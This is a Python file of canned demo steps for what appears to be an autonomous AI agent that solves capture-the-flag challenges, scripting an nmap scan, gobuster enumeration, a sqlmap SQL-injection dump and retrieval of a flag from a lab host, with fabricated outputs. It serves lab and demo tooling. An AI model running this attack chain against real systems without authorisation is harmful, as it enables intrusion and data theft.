"""Canned steps used when DEMO_MODE is on or LLM is unavailable."""

DEMO_SEQUENCE = [
    {
        "planner": "nmap -sV 10.0.0.5",
        "output": "Open ports: 22/tcp ssh, 80/tcp nginx, 3306/tcp mysql",
        "summary": "Surface mapped. Prioritize web enumeration and endpoint discovery.",
        "tokens": 380,
        "error": False,
    },
    {
        "planner": "gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/common.txt",
        "output": "Discovered: /admin /backup /uploads /robots.txt",
        "summary": "Interesting endpoints discovered. Continue with backup and parameter testing.",
        "tokens": 430,
        "error": False,
    },
    {
        "planner": 'sqlmap -u "http://10.0.0.5/admin?id=1" --batch',
        "output": 'id appears injectable. Table "flags" dumped successfully.',
        "summary": "SQL injection validated. Next action is extraction and verification of final flag.",
        "tokens": 515,
        "error": False,
    },
    {
        "planner": "cat /tmp/loot/flag.txt",
        "output": "FLAG{hacksynth_autonomous_ctf_success}",
        "summary": "Flag recovered. Autonomous loop can terminate safely.",
        "tokens": 250,
        "error": False,
        "flag": "FLAG{hacksynth_autonomous_ctf_success}",
    },
]
